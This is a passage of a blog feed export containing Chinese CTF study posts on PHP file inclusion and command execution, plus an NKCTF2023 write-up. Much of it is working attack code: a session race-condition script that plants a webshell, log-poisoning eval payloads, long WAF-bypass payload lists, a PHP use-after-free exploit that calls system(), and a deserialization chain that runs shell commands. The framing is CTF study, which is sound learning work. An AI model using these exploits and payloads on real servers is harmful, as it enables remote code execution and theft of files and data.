f*`;?&gt;【UA注入后日志包含】user-ugent:&lt;?=eval($_POST[cmd]);?&gt;访问日志文件:?file=/var/log/nginx/access.log使用POST执行命令:cmd=system(“ls”);在UA中注入编码过的代码不会被浏览器解码GET请求的参数在存入PHP之前也不会被解码，但是日志在转发到PHO的端口之前就已经写入日志了。【session临时文件条件竞争】在.被过滤后php中唯一能无后缀控制的，只有session文件当开启session时，服务器会在临时目录下创建session文件来保存会话信息，文件名格式为sess_PHPSESSID。一般的linux会将session保存在下面的的某一个目录下:     /var/lib/php/     /var/lib/php/sessions/     /tmp/     /tmp/sessions/web服务会使用多线程接收用户的请求，以确保能够处理并发进程或线程不同的程序段在多个并发请求时多个进程可能会同时创建同一个session文件那么攻击者就有可能在服务器创建session文件之前，先创建一个同名的session文件并利用PHP_SESSION_UPLOAD_PROGRESS设置文件内容，写入攻击者的命令如果成功存入了恶意文件，就能访问该文件并POST执行RCEEXP放在了文末【绕过die函数】思路:将die函数的代码语句编码成不能正常执行的命令，然后再将文件内的恶意代码编码成可执行命令。首先，base64加秘后会忽略掉一些符号以及中文字体(只有+, / , 0-9,a-z,A~Z,其余字符都会被跳过)又因为base64加密是4个一组，所以当你随意加上字符补齐die函数的编码时就能绕过die函数例如&quot;&lt;?php die(&#39;大佬别秀了&#39;);?&gt;&quot;解码的内容其实只有phpdie，所以需要再填充两位另外，因为php://filter伪协议支持使用多个过滤器所以可使用strip_tags与base64解码的形式来实现绕过死亡代码例如?file=php://filter/string.strip_tags|convert.base64-decode/resource=4.php除此之外，可以通过使用rot13加密让php引擎把该代码识别成乱码例如&lt;?=system(&#39;tac f*.php&#39;);?&gt;  ————&gt;  &lt;?=flfgrz(&#39;gnp s*.cuc&#39;);?&gt;&lt;?=flfgrz(&#39;gnp s*.cuc&#39;);?&gt;  ————&gt;  &lt;?=system(&#39;tac f*.php&#39;);?&gt;</code></pre><p>session文件条件竞争EXP</p><pre><code>import requestsimport ioimport threadingurl = &#39;&#39;    # 改成自己的urlsessionid = &#39;truthahn&#39;      # 设置PHPSESSID为truthahn，使生成的临时文件名为sess_truthahncookies = &#123;            &#39;PHPSESSID&#39;:sessionid        &#125;def write(session):        # write()函数用于写入session临时文件    fileBytes = io.BytesIO(b&#39;a&#39;*1024*50)    # 设置上传文件的大小为50k    data2 = &#123;        &#39;PHP_SESSION_UPLOAD_PROGRESS&#39;:&#39;&lt;?=eval($_POST[1])?&gt;&#39;    # 设置sess_truthahn临时文件的内容为&lt;?=eval($_POST[1])?&gt; 实现一句话    &#125;    files = &#123;        &#39;file&#39;:(&#39;truthahn.jpg&#39;,fileBytes)    &#125;    while True:            res = session.post(url,data=data2,cookies=cookies,files=files)        # print(res.text)        #print(&#39;======= write done! ======&#39;)def read(session):         # read()函数利用session临时文件生成一句话木马，实现rce    data1 = &#123;        &quot;1&quot;:&quot;file_put_contents(&#39;/var/www/html/3.php&#39;,&#39;&lt;?=eval($_POST[2]);?&gt;&#39;);&quot;     # 使用file_put_contents()php内置函数生成名为3.php的shell文件    &#125;    while True:        res = session.post(url+&#39;?file=/tmp/sess_&#39;+sessionid,data=data1,cookies=cookies)        # print(res.text)        res2 = session.get(url+&#39;3.php&#39;)        # print(res2.text)        if res2.status_code == 200:     #若3.php成功生成，则返回Done!，否则返回失败的状态码            print(&#39;++++++++ Done! +++++++++&#39;)        else:            print(res2.status_code)if __name__ == &#39;__main__&#39;:    event = threading.Event()           with requests.session() as session:     # 为每个函数设置5个线程并发执行，可以适当增加以应对系统执行的系统时间        for i in range(5):            #print(&#39;*&#39;*50)            threading.Thread(target=write,args=(session,)).start()        for i in range(5):            #print(&#39;=&#39;*50)            threading.Thread(target=read,args=(session,)).start()    event.set()</code></pre>]]></content>
    
    
      
      
    <summary type="html">&lt;h4 id=&quot;概念&quot;&gt;&lt;a href=&quot;#概念&quot; class=&quot;headerlink&quot; title=&quot;概念&quot;&gt;&lt;/a&gt;概念&lt;/h4&gt;&lt;p&gt;文件包含漏洞是指应用程序在处理文件路径时，没有进行足够的验证&lt;br&gt;导致攻击者可以利用此漏洞读取任意文件，执行任意代码甚至获取系统权限。 &lt;</summary>
      
    
    
    
    <category term="日报" scheme="https://liu1272.github.io/categories/%E6%97%A5%E6%8A%A5/"/>
    
    
    <category term="日报" scheme="https://liu1272.github.io/tags/%E6%97%A5%E6%8A%A5/"/>
    
  </entry>
  
  <entry>
    <title>命令执行</title>
    <link href="https://liu1272.github.io/2023/04/08/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/"/>
    <id>https://liu1272.github.io/2023/04/08/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/</id>
    <published>2023-04-08T11:37:00.000Z</published>
    <updated>2023-04-17T17:02:13.347Z</updated>
    
    <content type="html"><![CDATA[<h4 id="命令执行"><a href="#命令执行" class="headerlink" title="命令执行"></a>命令执行</h4><p>首先看过滤了什么东西，再按照下面的方法一点一点绕过。<br>再利用没过滤的字符构造playload<br>很多是可以泛用的，如果能找到一个很好用的也不错。</p><p>前置知识</p><pre><code>&lt;?=`ls /`;?&gt;等效于&lt;?php echo `ls /`; ?&gt;?cmd=?&gt;&lt;?=`ls \`;闭合第一个php，然后构造第二个短标签形式的phpphp文件上传时，一般是将文件上传到临时目录，然后再将临时目录移到其它地方PHP的一些标签有&lt;?...?&gt;&lt;%...%&gt;&lt;?php ...?&gt;&lt;script language=&quot;php&quot;&gt;...&lt;/script&gt;</code></pre><p>各种绕过手法</p><pre><code>【过滤变量名】重构变量?c=system($_GET[&#39;a&#39;]);&amp;a=cat flag.php;匹配符绕过?c=echo `cat fl&#39;&#39;ag.php`;?c=echo `cat fl/ag.txt`;?c=echo `cat fl*`;php里反引号相当于system执行系统命令两个引号分割是shell特性，执行时会自动忽略还有一点，过滤php时可以用Php大写绕过（乐~）【过滤system】system()assert()passthru()exec()           //只执行无回显shell_exec()     // 只执行无回显popen()          // 不会直接返回执行结果，而是返回一个文件指针popen( &#39;whoami &gt;&gt; c:/1.txt&#39;, &#39;r&#39; );proc_open()      //不会直接返回执行结果，而是返回一个文件指针pcntl_exec()call_user_func()还可以写马，也可以tac /fl\ag |tee 1.txt 将返回的内容写入1.txt【过滤cat】more:一页一页的显示档案内容less:与 more 类似head:查看头几行tac:从最后一行开始显示，是 cat 的反向显示tail:查看尾几行nl：显示的时候，顺便输出行号od:以二进制的方式读取档案内容vi:一种编辑器，这个也可以查看vim:一种编辑器，这个也可以查看sort:可以查看uniq:可以查看file -f:报错出具体内容sh /flag 2&gt;%261  //报错出文件内容strings:可以查看rev:反过来看新增一个xxd可以读取文件curl file:///flag 也行bash -v:/etc/passwddate -f:好像可以越权读取文件/bin/cat:/bin/是cat的目录，意思是执行/bin/cat文件,再用?cat代替cat【过滤空格】&lt;&lt;&gt;%09%20$IFS$&#123;IFS&#125;$IFS$9$IFS$1顺便提一句，%09表示的是制表符，是shell里的空格，而不是php的空格因为浏览器会自动对特殊字符进行编码所以使用%09表示制表符也是可以被浏览器正确识别的【过滤;】使用?&gt;替换，因为最后一句不用分号include，也就是说应该传入一个文件名include的文件中出错了但是主程序会继续往下执行【过滤括号】使用不用括号的函数(伪协议)?c=php://filter/read=convert.base64-encode/resource=flag.php伪协议也可以重构变量?c=include$_GET[1]?&gt;&amp;1=php://filter/convert.base64-encode/resource=flag.php?c=include$_GET[x]?&gt;&amp;x=php://filter/convert.base64-encode/resource=flag.txt【PHP伪协议】file:// — 访问本地文件系统http:// — 访问 HTTP(s) 网址ftp:// — 访问 FTP(s) URLsphp:// — 访问各个输入/输出流（I/O streams）zlib:// — 压缩流data:// — 数据（RFC 2397）glob:// — 查找匹配的文件路径模式phar:// — PHP 归档ssh2:// — Secure Shell 2rar:// — RARogg:// — 音频流expect:// — 处理交互式的流【文件按包含漏洞】使用data://协议执行PHP代码?c=data://text/plain,&lt;?php system(&quot;cat fla*&quot;);?&gt;     显示文件源码?c=data://text/plain,&lt;?=system(&#39;tac fl&quot;&quot;ag.php&#39;);?&gt;      查看日志此处让网页直接包含我们写入的代码，从而执行恶意命令但是仍然要绕过对flag的过滤【常用套娃函数】session_id()：用来获取/设置当前会话 ID，可以获取phpsessionid，并且值是可控的getallheaders()：返回所有的HTTP头信息get_defined_vars() 返回一个包含所有已定义变量列表的多维数组array_pop() 是删除并返回数组最后一个元素current() 返回数组中的当前元素的值。别名是pos()next() 返回数组中的下一个元素的值。end()最后一个prev() 将数组中的内部指针倒回一位each() 返回数组中当前的键/值对并将数组指针向前移动一步scandir() 函数返回指定目录中的文件和目录的数组。print_r() 函数用于打印变量，以更容易理解的形式展示。localeconv()函数会返回一一个包含本地数字及货币格式信息的数组（其实就是.）current() 函数返回数组中的当前元素的值。别名是pos()array_reverse() 函数将原数组中的元素顺序翻转，创建新的数组并返回。read_file()  读出源码highlight_file()  读出源码show_source()  读出源码include()  读出源码file_get_contents()  读出源码还能先include(&quot;文件&quot;)再echo $变量;还能先require(&quot;文件&quot;)再echo $变量;还能先include(&quot;文件&quot;);再var_dump(get_defined_vars());【套娃例子】要使用POST传参时:?c=eval(array_pop(next(get_defined_vars())));cmd=system(“cat flag.php”);不使用POST传参时:?c=show_source(next(array_reverse(scandir(pos(localeconv())))));在COOKIE处传马时:/?c=show_source(session_id(session_start()));再把PHPSSID值设为flag.php只使用POST传参时:c=print_r(scandir(&#39;.&#39;));【重定向绕过】0   标准输入1   标准输出2   错误输出/dev/null(空设备)丢弃一切写入其中的数据(但报告写入操作成功)区别：   2&gt;/dev/null   把错误输出到空设备（即丢弃）   2&gt;&amp;1 &gt;/dev/null   错误输出到屏幕上，而标准输出被丢弃   &gt;/dev/null 2&gt;&amp;1   相当于1&gt;/dev/null 2&gt;&amp;1错误和标准输出都输出到空设备重定向&gt;和&gt;&gt;：   前者会先清空文件再写入内容，后者会将重定向的内容追加到现有文件的尾部使用;  &amp;&amp;  %0a  ||等等绕过即可因为过滤代码只将最后一个命令输出到null，使用;或运算符分隔就行但是要注意所用的PHP版本会影响效果，多试试。【无字母数字的命令执行】/bin/base64以base64加密输出文件所以payload: /?c=/???/????64 ????.???或者/usr/bin/bzip2将文件压缩为文件名.bz2然后访问payload: /?c=/???/???/????2 ????.???【文件上传形式的命令执行】原理是通过POST上传一个文件，文件内容是要执行的命令使用点命令执行该文件时形成条件竞争这个文件默认保存在/tmp/phpxxxx路径下，所以可以通过/???/????????[@-[]来构成这个路径[@-[]为匹配ascii码范围在@-[的字符（A，Z被屏蔽，所以范围大一位）之所以用[@-[]是因为直接用/???/?????????匹配到的其他文件都是小写字母，只有php临时生成的文件才包含大写字母。就算这样，也不一定能够准确地匹配到我们的上传文件，所以可能要多次刷新。POST的参数为?c=.%20/???/????????[@-[]上传下面的内容可以达到命令执行的效果#!  /bin/bashls【数学整数计算】$(())表示运算符计算，且默认相加，~是取反的意思$(())能进行的运算有 + - * / % &amp; | ^ ! AND OR XOR NOT    $(()) = 0    ~$(()) = -0    $((~$(()))) = -1    $((~$(()))) = -1    ~$((~$(()))) = 1    echo $((a+b*c)) = 19    $(($((~ $(()))) $((~ $(()))) $((~ $(()))))) = -3【命令执行后继续对回显操作】（1）使用exit();直接退出。（2）使用POST方法查找目录(post参数可以直接被执行的时候)c=$a=&quot;glob:// /*.txt&quot;;  if ($b = opendir($a)) &#123;    while(($file = readdir($b))) !== false) &#123;      echo&quot;filename:&quot;.$file.&quot;\n&quot;;    &#125;    closedir($b);  &#125;exit(0);（3）在POST传参获取mysql数据c=try &#123;$dbh = new PDO(&#39;mysql:host=localhost;dbname=数据库名&#39;, &#39;账号&#39;,&#39;密码&#39;);foreach($dbh-&gt;query(&#39;select load_file(&quot;文件名&quot;)&#39;) as $row)&#123;echo($row[0]).&quot;|&quot;; &#125;$dbh = null;&#125;catch (PDOException $e) &#123;echo $e-&gt;getMessage();exit(0);&#125;exit(0);（4）用POST方法重定向文件内容输出到其他地方c=?&gt;&lt;?php $ffi = FFI::cdef(&quot;int system(const char *command);&quot;);$ffi-&gt;system(&quot;/要读的文件&gt;存到那个文件&quot;);exit();【使用bash内置变量构造RCE】因为一般题目都在/var/www/html下经过多次尝试，最后能构造出nl在加上通配符？匹配文件$&#123;HOME:~0&#125;$&#123;PATH:~0&#125;$&#123;PWD:~A&#125;$&#123;USER:~A&#125;</code></pre><h5 id="上面提到的一些小脚本或快捷命令"><a href="#上面提到的一些小脚本或快捷命令" class="headerlink" title="上面提到的一些小脚本或快捷命令"></a>上面提到的一些小脚本或快捷命令</h5><p>下面是通过或运算构造字符（无字母数字命令执行）<br>通过一些字符互相运算后构造得到我们的payload<br>当异或自增和取反构造字符都无法使用，但是可以用|<br>要求使用POST方式传参，且传入的参数可以直接执行时<br>但是注意尽量使用Python发包，hackbar和BP有时候不是很好用。</p><pre><code>import reimport urllibimport requestsfrom urllib import parse hex_i = &quot;&quot; hex_j = &quot;&quot; pattern=&#39;/[0-9]|[a-z]|\^|\+|\~|\$|\[|\]|\&#123;|\&#125;|\&amp;|\-/i&#39;# str1=[&quot;system&quot;,&quot;cat flag.php&quot;]# for p in range(2):     t1 = &quot;&quot;     t2 = &quot;&quot;     for k in str1[p]:         for i in range(256):             for j in range(256):                 if re.search(pattern,chr(i)) :                     break                 if re.search(pattern,chr(j)) :                     continue                 if i &lt; 16:                     hex_i = &quot;0&quot; + hex(i)[2:]                 else:                     hex_i=hex(i)[2:]                 if j &lt; 16:                     hex_j=&quot;0&quot;+hex(j)[2:]                 else:                     hex_j=hex(j)[2:]                 hex_i=&#39;%&#39;+hex_i                 hex_j=&#39;%&#39;+hex_j                 c=chr(ord(urllib.parse.unquote(hex_i))|ord(urllib.parse.unquote(hex_j)))                 if(c ==k):                     t1=t1+hex_i                     t2=t2+hex_j                     break             else:                 continue             break     payload = &quot;(\&quot;&quot;+t1+&quot;\&quot;|\&quot;&quot;+t2+&quot;\&quot;)&quot;     print(payload)payload=&#39;(&quot;%13%19%13%14%05%0d&quot;|&quot;%60%60%60%60%60%60&quot;)(&quot;%03%01%14%00%06%0c%01%07%00%10%08%10&quot;|&quot;%60%60%60%20%60%60%60%60%2e%60%60%60&quot;)&#39;print(payload)data=&#123;    &quot;c&quot;:urllib.parse.unquote(payload)&#125;url=&quot;??????&quot;re=requests.post(url,data=data)print(re.text)</code></pre><p>下面是文件上传的页面</p><pre><code>&lt;!DOCTYPE html&gt;&lt;html&gt;&lt;body&gt;&lt;form action=&quot;http://40ebaa4e-8bb9-4a0d-ba18-623eea11822d.challenge.ctf.show/&quot; method=&quot;POST&quot; enctype=&quot;multipart/form-data&quot;&gt;&lt;input type=&quot;hidden&quot; name=&quot;PHP_SESSION_UPLOAD_PROGRESS&quot; value=&quot;2333&quot; /&gt;&lt;input type=&quot;file&quot; name=&quot;file&quot; /&gt;&lt;input type=&quot;submit&quot; value=&quot;submit&quot; /&gt;&lt;/form&gt;&lt;/body&gt;&lt;/html&gt;&lt;?phpsession_start();?&gt;</code></pre><p>利用PHP垃圾回收漏洞显示出文件内容POC，记得编码</p><pre><code>&lt;?phpfunction ctfshow($cmd) &#123;    global $abc, $helper, $backtrace;    class Vuln &#123;        public $a;        public function __destruct() &#123;             global $backtrace;             unset($this-&gt;a);            $backtrace = (new Exception)-&gt;getTrace();            if(!isset($backtrace[1][&#39;args&#39;])) &#123;                $backtrace = debug_backtrace();            &#125;        &#125;    &#125;    class Helper &#123;        public $a, $b, $c, $d;    &#125;    function str2ptr(&amp;$str, $p = 0, $s = 8) &#123;        $address = 0;        for($j = $s-1; $j &gt;= 0; $j--) &#123;            $address &lt;&lt;= 8;            $address |= ord($str[$p+$j]);        &#125;        return $address;    &#125;    function ptr2str($ptr, $m = 8) &#123;        $out = &quot;&quot;;        for ($i=0; $i &lt; $m; $i++) &#123;            $out .= sprintf(&quot;%c&quot;,($ptr &amp; 0xff));            $ptr &gt;&gt;= 8;        &#125;        return $out;    &#125;    function write(&amp;$str, $p, $v, $n = 8) &#123;        $i = 0;        for($i = 0; $i &lt; $n; $i++) &#123;            $str[$p + $i] = sprintf(&quot;%c&quot;,($v &amp; 0xff));            $v &gt;&gt;= 8;        &#125;    &#125;    function leak($addr, $p = 0, $s = 8) &#123;        global $abc, $helper;        write($abc, 0x68, $addr + $p - 0x10);        $leak = strlen($helper-&gt;a);        if($s != 8) &#123; $leak %= 2 &lt;&lt; ($s * 8) - 1; &#125;        return $leak;    &#125;    function parse_elf($base) &#123;        $e_type = leak($base, 0x10, 2);        $e_phoff = leak($base, 0x20);        $e_phentsize = leak($base, 0x36, 2);        $e_phnum = leak($base, 0x38, 2);        for($i = 0; $i &lt; $e_phnum; $i++) &#123;            $header = $base + $e_phoff + $i * $e_phentsize;            $p_type  = leak($header, 0, 4);            $p_flags = leak($header, 4, 4);            $p_vaddr = leak($header, 0x10);            $p_memsz = leak($header, 0x28);            if($p_type == 1 &amp;&amp; $p_flags == 6) &#123;                 $data_addr = $e_type == 2 ? $p_vaddr : $base + $p_vaddr;                $data_size = $p_memsz;            &#125; else if($p_type == 1 &amp;&amp; $p_flags == 5) &#123;                 $text_size = $p_memsz;            &#125;        &#125;        if(!$data_addr || !$text_size || !$data_size)            return false;        return [$data_addr, $text_size, $data_size];    &#125;    function get_basic_funcs($base, $elf) &#123;        list($data_addr, $text_size, $data_size) = $elf;        for($i = 0; $i &lt; $data_size / 8; $i++) &#123;            $leak = leak($data_addr, $i * 8);            if($leak - $base &gt; 0 &amp;&amp; $leak - $base &lt; $data_addr - $base) &#123;                $deref = leak($leak);                                if($deref != 0x746e6174736e6f63)                    continue;            &#125; else continue;            $leak = leak($data_addr, ($i + 4) * 8);            if($leak - $base &gt; 0 &amp;&amp; $leak - $base &lt; $data_addr - $base) &#123;                $deref = leak($leak);                if($deref != 0x786568326e6962)                    continue;            &#125; else continue;            return $data_addr + $i * 8;        &#125;    &#125;    function get_binary_base($binary_leak) &#123;        $base = 0;        $start = $binary_leak &amp; 0xfffffffffffff000;        for($i = 0; $i &lt; 0x1000; $i++) &#123;            $addr = $start - 0x1000 * $i;            $leak = leak($addr, 0, 7);            if($leak == 0x10102464c457f) &#123;                return $addr;            &#125;        &#125;    &#125;    function get_system($basic_funcs) &#123;        $addr = $basic_funcs;        do &#123;            $f_entry = leak($addr);            $f_name = leak($f_entry, 0, 6);            if($f_name == 0x6d6574737973) &#123;                return leak($addr + 8);            &#125;            $addr += 0x20;        &#125; while($f_entry != 0);        return false;    &#125;    function trigger_uaf($arg) &#123;        $arg = str_shuffle(&#39;AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA&#39;);        $vuln = new Vuln();        $vuln-&gt;a = $arg;    &#125;    if(stristr(PHP_OS, &#39;WIN&#39;)) &#123;        die(&#39;This PoC is for *nix systems only.&#39;);    &#125;    $n_alloc = 10;     $contiguous = [];    for($i = 0; $i &lt; $n_alloc; $i++)        $contiguous[] = str_shuffle(&#39;AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA&#39;);    trigger_uaf(&#39;x&#39;);    $abc = $backtrace[1][&#39;args&#39;][0];    $helper = new Helper;    $helper-&gt;b = function ($x) &#123; &#125;;    if(strlen($abc) == 79 || strlen($abc) == 0) &#123;        die(&quot;UAF failed&quot;);    &#125;    $closure_handlers = str2ptr($abc, 0);    $php_heap = str2ptr($abc, 0x58);    $abc_addr = $php_heap - 0xc8;    write($abc, 0x60, 2);    write($abc, 0x70, 6);    write($abc, 0x10, $abc_addr + 0x60);    write($abc, 0x18, 0xa);    $closure_obj = str2ptr($abc, 0x20);    $binary_leak = leak($closure_handlers, 8);    if(!($base = get_binary_base($binary_leak))) &#123;        die(&quot;Couldn&#39;t determine binary base address&quot;);    &#125;    if(!($elf = parse_elf($base))) &#123;        die(&quot;Couldn&#39;t parse ELF header&quot;);    &#125;    if(!($basic_funcs = get_basic_funcs($base, $elf))) &#123;        die(&quot;Couldn&#39;t get basic_functions address&quot;);    &#125;    if(!($zif_system = get_system($basic_funcs))) &#123;        die(&quot;Couldn&#39;t get zif_system address&quot;);    &#125;    $fake_obj_offset = 0xd0;    for($i = 0; $i &lt; 0x110; $i += 8) &#123;        write($abc, $fake_obj_offset + $i, leak($closure_obj, $i));    &#125;    write($abc, 0x20, $abc_addr + $fake_obj_offset);    write($abc, 0xd0 + 0x38, 1, 4);     write($abc, 0xd0 + 0x68, $zif_system);     ($helper-&gt;b)($cmd);    exit();&#125;ctfshow(&quot;指令填写在这里！！！&quot;);ob_end_flush();?&gt;</code></pre><p>读取文件函数一览表</p><pre><code>highlight_file($filename);show_source($filename);print_r(php_strip_whitespace($filename));print_r(file_get_contents($filename));readfile($filename);print_r(file($filename)); // var_dumpfread(fopen($filename,&quot;r&quot;), $size);include($filename); // 非php代码include_once($filename); // 非php代码require($filename); // 非php代码require_once($filename); // 非php代码print_r(fread(popen(&quot;cat flag&quot;, &quot;r&quot;), $size));print_r(fgets(fopen($filename, &quot;r&quot;))); // 读取一行fpassthru(fopen($filename, &quot;r&quot;)); // 从当前位置一直读取到 EOFprint_r(fgetcsv(fopen($filename,&quot;r&quot;), $size));print_r(fgetss(fopen($filename, &quot;r&quot;))); // 从文件指针中读取一行并过滤掉 HTML 标记print_r(fscanf(fopen(&quot;flag&quot;, &quot;r&quot;),&quot;%s&quot;));print_r(parse_ini_file($filename)); // 失败时返回 false , 成功返回配置数组</code></pre><p>读取目录一览表</p><pre><code>print_r(glob(&quot;*&quot;)); // 列当前目录print_r(glob(&quot;/*&quot;)); // 列根目录print_r(scandir(&quot;.&quot;));print_r(scandir(&quot;/&quot;));$d=opendir(&quot;.&quot;);while(false!==($f=readdir($d)))&#123;echo&quot;$f\n&quot;;&#125;$d=dir(&quot;.&quot;);while(false!==($f=$d-&gt;read()))&#123;echo$f.&quot;\n&quot;;&#125;$a=glob(&quot;/*&quot;);foreach($a as $value)&#123;echo $value.&quot;   &quot;;&#125;$a=new DirectoryIterator(&#39;glob:///*&#39;);foreach($a as $f)&#123;echo($f-&gt;__toString().&quot; &quot;);&#125;</code></pre>]]></content>
    
    
      
      
    <summary type="html">&lt;h4 id=&quot;命令执行&quot;&gt;&lt;a href=&quot;#命令执行&quot; class=&quot;headerlink&quot; title=&quot;命令执行&quot;&gt;&lt;/a&gt;命令执行&lt;/h4&gt;&lt;p&gt;首先看过滤了什么东西，再按照下面的方法一点一点绕过。&lt;br&gt;再利用没过滤的字符构造playload&lt;br&gt;很多是可以泛用的，</summary>
      
    
    
    
    <category term="日报" scheme="https://liu1272.github.io/categories/%E6%97%A5%E6%8A%A5/"/>
    
    
    <category term="日报" scheme="https://liu1272.github.io/tags/%E6%97%A5%E6%8A%A5/"/>
    
  </entry>
  
  <entry>
    <title>CTFshow刷题记录</title>
    <link href="https://liu1272.github.io/2023/04/07/CTFshow%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/"/>
    <id>https://liu1272.github.io/2023/04/07/CTFshow%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/</id>
    <published>2023-04-07T11:51:00.000Z</published>
    <updated>2023-04-20T10:39:48.118Z</updated>
    
    <content type="html"><![CDATA[<h4 id="本文会一直更新，不会分开多个文章记载刷题记录"><a href="#本文会一直更新，不会分开多个文章记载刷题记录" class="headerlink" title="本文会一直更新，不会分开多个文章记载刷题记录"></a>本文会一直更新，不会分开多个文章记载刷题记录</h4><h5 id="文章只记载最简单的最重要的思路"><a href="#文章只记载最简单的最重要的思路" class="headerlink" title="文章只记载最简单的最重要的思路"></a>文章只记载最简单的最重要的思路</h5><h5 id="信息泄露"><a href="#信息泄露" class="headerlink" title="信息泄露"></a>信息泄露</h5><p>既然是信息泄露，自然不会很难，基本上都是工具一把嗦。</p><pre><code>F12robots.txtjsindex.php~抓包index.phpswww.zip.git.svn.index.php.swp.index.php.bak.index.php.swo.index.php.swn.DS_Store.hg邮箱，电话号码泄露技术文档editor编辑器探针backup.sql/db/db.mdb抓包返回状态</code></pre><h5 id="爆破-BP"><a href="#爆破-BP" class="headerlink" title="爆破(BP)"></a>爆破(BP)</h5><p>爆破简单的用BP完全足够了，难一点的写个Python脚本。</p><pre><code>Payload set         ----&gt;  custom iterator(自定义迭代器)需要进行base64编码  ----&gt;  payload processing 进行编码设置取消Palyload Encoding编码,因为在进行base64加密的时候在最后可能存在 == 会影响base64加密的结果有多重目录的url可以用number爆破出动态地址，同时记得改一下页面index.php</code></pre><h5 id="命令执行"><a href="#命令执行" class="headerlink" title="命令执行"></a>命令执行</h5><p>请查看下一篇文章。</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h4 id=&quot;本文会一直更新，不会分开多个文章记载刷题记录&quot;&gt;&lt;a href=&quot;#本文会一直更新，不会分开多个文章记载刷题记录&quot; class=&quot;headerlink&quot; title=&quot;本文会一直更新，不会分开多个文章记载刷题记录&quot;&gt;&lt;/a&gt;本文会一直更新，不会分开多个文章记载刷题</summary>
      
    
    
    
    <category term="日报" scheme="https://liu1272.github.io/categories/%E6%97%A5%E6%8A%A5/"/>
    
    
    <category term="日报" scheme="https://liu1272.github.io/tags/%E6%97%A5%E6%8A%A5/"/>
    
  </entry>
  
  <entry>
    <title>NKCTF2023WP</title>
    <link href="https://liu1272.github.io/2023/03/27/NKCTF2023WP/"/>
    <id>https://liu1272.github.io/2023/03/27/NKCTF2023WP/</id>
    <published>2023-03-27T15:00:00.000Z</published>
    <updated>2023-03-27T17:23:34.473Z</updated>
    
    <content type="html"><![CDATA[<h5 id="前话"><a href="#前话" class="headerlink" title="前话"></a>前话</h5><p>这次CTF比赛对我来说难度感觉适中偏难吧，很多题都是可以写的<br>只是因为比赛是团队合作，所以就把难题留给大哥们了。<br>当然，这不是重点，重点是从中学到了啥。</p><h4 id="WriteUp"><a href="#WriteUp" class="headerlink" title="WriteUp"></a>WriteUp</h4><h5 id="Web"><a href="#Web" class="headerlink" title="Web"></a>Web</h5><p><strong>BabyPHP</strong></p><pre><code>&lt;?php    error_reporting(0);    class Welcome&#123;        public $name;        public $arg = &#39;oww!man!!&#39;;        public function __construct()&#123;            $this-&gt;name = &#39;ItS SO CREAZY&#39;;        &#125;        public function __destruct()&#123;            if($this-&gt;name == &#39;welcome_to_NKCTF&#39;)&#123;                echo $this-&gt;arg;            &#125;        &#125;    &#125;    function waf($string)&#123;        if(preg_match(&#39;/f|l|a|g|\*|\?/i&#39;, $string))&#123;            die(&quot;you are bad&quot;);        &#125;    &#125;    class Happy&#123;        public $shell;        public $cmd;        public function __invoke()&#123;            $shell = $this-&gt;shell;            $cmd = $this-&gt;cmd;            waf($cmd);            eval($shell($cmd));        &#125;    &#125;    class Hell0&#123;        public $func;        public function __toString()&#123;            $function = $this-&gt;func;            $function();        &#125;    &#125;    if(isset($_GET[&#39;p&#39;]))&#123;        unserialize($_GET[&#39;p&#39;]);    &#125;else&#123;        highlight_file(__FILE__);    &#125;?&gt;进行反序列化&lt;?phperror_reporting(0);class Welcome&#123;    public $name;    public $arg;    public function __construct()    &#123;        $this-&gt;name = new Hell0();    &#125;&#125;function waf($string)&#123;    if (preg_match(&#39;/f|l|a|g|\*|\?/i&#39;, $string)) &#123;        die(&quot;you are bad&quot;);    &#125;&#125;class Happy&#123;    public $shell;    public $cmd;    public function __construct()    &#123;        $this-&gt;shell = &#39;system&#39;;        // flag*?        $this-&gt;cmd = &#39;cd /;more `php -r &quot;echo chr(102).chr(49).chr(97).chr(103);&quot;`&#39;;    &#125;    public function __invoke()    &#123;        $shell = $this-&gt;shell;        $cmd = $this-&gt;cmd;        waf($cmd);        eval($shell($cmd));    &#125;&#125;class Hell0&#123;    public $func;    public function __construct()    &#123;        $this-&gt;func = new Happy();    &#125;&#125;$a = new Welcome();echo urlencode(serialize($a));</code></pre><p><strong>EazyPHP</strong></p><pre><code>&lt;?php     highlight_file(__FILE__);    error_reporting(0);    if($_GET[&#39;a&#39;] != $_GET[&#39;b&#39;] &amp;&amp; md5($_GET[&#39;a&#39;]) == md5($_GET[&#39;b&#39;]))&#123;        if((string)$_POST[&#39;c&#39;] != (string)$_POST[&#39;d&#39;] &amp;&amp; sha1($_POST[&#39;c&#39;]) === sha1($_POST[&#39;d&#39;]))&#123;            if($_GET[&#39;e&#39;] != 114514 &amp;&amp; intval($_GET[&#39;e&#39;]) == 114514)&#123;                if(isset($_GET[&#39;NS_CTF.go&#39;]))&#123;                    if(isset($_POST[&#39;cmd&#39;]))&#123;                        if(!preg_match(&#39;/[0-9a-zA-Z]/i&#39;, $_POST[&#39;cmd&#39;]))&#123;                            eval($_POST[&#39;cmd&#39;]);                        &#125;else&#123;                            die(&#39;error!!!!!!&#39;);                        &#125;                    &#125;else&#123;                        die(&#39;error!!!!!&#39;);                    &#125;                &#125;else&#123;                    die(&#39;error!!!!&#39;);                &#125;            &#125;else&#123;                die(&#39;error!!!&#39;);            &#125;        &#125;else&#123;            die(&#39;error!!&#39;);        &#125;    &#125;else&#123;        die(&#39;error!&#39;);    &#125;?&gt; 